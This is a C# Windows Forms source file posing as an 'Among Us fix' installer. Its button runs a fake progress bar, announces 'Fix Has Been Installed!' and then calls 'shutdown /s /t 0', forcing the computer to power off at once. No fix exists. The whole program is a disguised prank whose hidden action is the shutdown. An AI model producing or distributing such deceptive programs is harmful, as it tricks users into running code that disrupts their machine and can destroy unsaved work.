using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Among_us_fix
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < 101; i++)
            {
                progressBar1.Value = i;
                if (i == 44)
                {
                    Thread.Sleep(2000);
                }
                Thread.Sleep(50);
            }
            button1.Text = "Fix Has Been Installed!";
            button1.Enabled = false;
            Thread.Sleep(1000);
            Process.Start("shutdown", "/s /t 0");
        }
    }
}
